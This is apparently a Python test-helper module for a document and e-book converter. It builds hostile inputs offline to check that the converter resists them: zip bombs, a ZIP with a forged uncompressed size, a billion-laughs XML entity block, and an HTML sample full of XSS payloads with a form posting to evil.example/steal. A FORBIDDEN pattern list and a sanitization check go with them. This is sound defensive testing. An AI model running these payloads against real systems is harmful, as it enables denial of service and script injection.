"""Общие помощники тестов этапа 4 (книги, документы, таблицы).

Всё генерируется в тестах, без сети: картинки (Pillow), EPUB/FB2/MOBI/DOCX/XLSX.
"""

from __future__ import annotations

import io
import multiprocessing
import os
import struct
import time
import zipfile
from contextlib import nullcontext
from pathlib import Path

import pytest
from PIL import Image

from konverter.converters import _docjob, _isolated
from konverter.converters.base import CancelToken, Preset
from konverter.core import naming


class Reporter:
    def __init__(self) -> None:
        self.values: list[float] = []

    def __call__(self, fraction, *marks) -> None:
        if fraction is not None:
            self.values.append(fraction)

    def final(self) -> None:
        pass


def make_inproc(monkeypatch):
    """`run_task` → `_docjob.child_task` в процессе тестов (ошибки — как у родителя)."""
    calls: list[dict] = []

    def fake_run_task(task, args, *, cancel, progress=None, stall_timeout, max_time,
                      memory_limit=None, pool="long", hold=None):
        assert task == "docs" and pool == "docs"
        calls.append(args)
        with (hold() if hold is not None else nullcontext()):
            try:
                return _docjob.child_task(args, Reporter())
            except _isolated.TaskError as exc:
                raise _isolated.TaskFailed(exc.key, exc.params) from exc
            except MemoryError as exc:
                raise _isolated.ChildFailed("memory") from exc
            except Exception as exc:  # noqa: BLE001 — как в ребёнке: «повреждён»
                raise _isolated.ChildFailed("damaged", type(exc).__name__) from exc

    monkeypatch.setattr(_isolated, "run_task", fake_run_task)
    return calls


def target(converter, fmt: str, tid: str):
    return next(t for t in converter.targets(fmt) if t.id == tid)


def run(converter, src: Path, dst: Path, fmt: str, tid: str, preset=Preset.MEDIUM,
        progress=None, cancel=None) -> Path:
    """`convert` с подготовкой dst, как это делает ядро (файл или папка)."""
    t = target(converter, fmt, tid)
    if t.extension:
        Path(naming.os_path(dst)).touch()
    else:
        os.makedirs(naming.os_path(dst), exist_ok=True)
    converter.convert([Path(src)], Path(dst), t, preset, progress or (lambda _p: None),
                      cancel or CancelToken(), formats=[fmt])
    return Path(dst)


def no_children() -> bool:
    deadline = time.monotonic() + 5
    while time.monotonic() < deadline:
        if not multiprocessing.active_children():
            return True
        time.sleep(0.05)
    return False


def wait_jobs(jobs, timeout=90.0) -> None:
    deadline = time.monotonic() + timeout
    while not all(j.is_finished for j in jobs) and time.monotonic() < deadline:
        time.sleep(0.05)


def png_bytes(color=(200, 30, 30), size=(40, 30)) -> bytes:
    out = io.BytesIO()
    Image.new("RGB", size, color).save(out, format="PNG")
    return out.getvalue()


def jpeg_bytes(color=(30, 120, 200), size=(60, 80)) -> bytes:
    out = io.BytesIO()
    Image.new("RGB", size, color).save(out, format="JPEG", quality=90)
    return out.getvalue()


def zip_names(path: Path) -> list[str]:
    with zipfile.ZipFile(path) as archive:
        return archive.namelist()


def zip_text(path: Path) -> str:
    """Всё текстовое содержимое архива (для поиска запрещённого)."""
    parts = []
    with zipfile.ZipFile(path) as archive:
        for name in archive.namelist():
            data = archive.read(name)
            parts.append(data.decode("utf-8", errors="ignore"))
    return "\n".join(parts)


def bomb_zip(path: Path, *, members: dict[str, bytes], bomb_name: str,
             bomb_size: int = 200 * 2**20) -> Path:
    """ZIP с обычными записями и одной «бомбой» (нули, сжатие ~1000:1)."""
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
        info = zipfile.ZipInfo("mimetype")
        info.compress_type = zipfile.ZIP_STORED
        if "mimetype" in members:
            archive.writestr(info, members.pop("mimetype"))
        for name, data in members.items():
            archive.writestr(name, data)
        with archive.open(bomb_name, "w", force_zip64=True) as stream:
            block = b"\0" * (4 * 2**20)
            for _ in range(bomb_size // len(block)):
                stream.write(block)
    return path


def lie_about_size(path: Path, name: str, fake_size: int) -> None:
    """Подменяет распакованный размер записи в центральном каталоге и локальном заголовке."""
    data = bytearray(path.read_bytes())
    encoded = name.encode("utf-8")
    pos = 0
    while True:
        pos = data.find(b"PK\x01\x02", pos)
        if pos < 0:
            break
        name_len = struct.unpack("<H", data[pos + 28:pos + 30])[0]
        if bytes(data[pos + 46:pos + 46 + name_len]) == encoded:
            data[pos + 24:pos + 28] = struct.pack("<I", fake_size)
            local = struct.unpack("<I", data[pos + 42:pos + 46])[0]
            data[local + 22:local + 26] = struct.pack("<I", fake_size)
        pos += 4
    path.write_bytes(bytes(data))


def many_entries_zip(path: Path, count: int = 100_000, first: dict[str, bytes] | None = None) -> Path:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_STORED) as archive:
        for name, data in (first or {}).items():
            archive.writestr(name, data)
        for index in range(count):
            archive.writestr(f"x/{index}", b"")
    return path


@pytest.fixture
def secret(tmp_path) -> Path:
    path = tmp_path / "секрет.txt"
    path.write_text("СЕКРЕТНОЕ-СОДЕРЖИМОЕ-42", encoding="utf-8")
    return path


def file_uri(path: Path) -> str:
    return "file:///" + str(path).replace("\\", "/")


LAUGHS = (
    '<!DOCTYPE lolz [<!ENTITY lol "lol">'
    '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">'
    '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
    '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
    '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'
    '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">'
    '<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">'
    '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">'
    '<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>'
)

# Активное содержимое, которого не должно быть в результатах HTML/EPUB.
EVIL_HTML = (
    '<h1>Заголовок</h1>'
    '<p>Абзац <b>жирный</b> и <i>курсив</i>, '
    '<a href="https://example.com/путь">хорошая ссылка</a>, '
    '<a href="javascript:alert(1)">плохая</a>, <a href=" JaVa\tScRiPt:alert(2)">ещё</a>, '
    '<a href="vbscript:x">vb</a>, <a href="data:text/html;base64,PHNjcmlwdD4=">дата</a>.</p>'
    '<script>alert("XSS-SCRIPT")</script>'
    '<img src="http://tracker.example/pixel.gif" onerror="alert(3)">'
    '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">'
    '<iframe src="https://evil.example/"></iframe>'
    '<object data="x.swf"></object><embed src="y.swf">'
    '<form action="https://evil.example/steal"><input name="p"><button>Отправить</button></form>'
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">'
    '<base href="https://evil.example/">'
    '<link rel="stylesheet" href="https://evil.example/s.css">'
    '<style>@import url(https://evil.example/a.css); body{background:url(https://evil.example/b)}</style>'
    '<div style="background:url(http://evil.example/c.png)" onclick="alert(4)" '
    'onmouseover="alert(5)">Текст в div</div>'
    '<svg><script>alert(6)</script></svg>'
    '<ul><li>Пункт один</li><li>Пункт два</li></ul>'
    '<ol><li>Первый</li><li>Второй</li></ol>'
    '<table><tr><th>Имя</th><th>Город</th></tr><tr><td>Иван</td><td>Москва</td></tr></table>'
)

FORBIDDEN = (
    "<script", "onerror", "onclick", "onmouseover", "javascript:", "vbscript:",
    "data:text/html", "<iframe", "<object", "<embed", "<form", "refresh", "<base",
    "<link rel=\"stylesheet\" href=\"http", "@import", "url(", "tracker.example",
    "evil.example", "XSS-SCRIPT", "svg+xml",
)


def assert_clean(text: str) -> None:
    low = text.lower()
    for bad in FORBIDDEN:
        assert bad.lower() not in low, bad
